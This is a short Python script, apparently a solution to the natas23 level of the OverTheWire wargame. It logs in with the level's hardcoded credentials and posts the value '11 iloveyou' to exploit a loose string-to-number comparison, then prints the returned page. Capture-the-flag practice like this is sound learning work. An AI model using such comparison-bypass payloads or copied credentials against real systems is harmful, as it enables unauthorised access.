# Name: Michael Krakovsky
# Date: April 26, 2019
# Description: Create a script to break the code on natas23.
# Version: 1.0

from requests import Session
from pyperclip import copy

username = "natas23"
passwd = "D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE"
url = "http://natas23.natas.labs.overthewire.org/"      # This is how we turn on the debug variables.

session = Session()

getResponse = session.post(url, data={"passwd" : "11 iloveyou"}, auth=(username, passwd))
print(getResponse.text)
print(50 * '-')
copy(getResponse.text)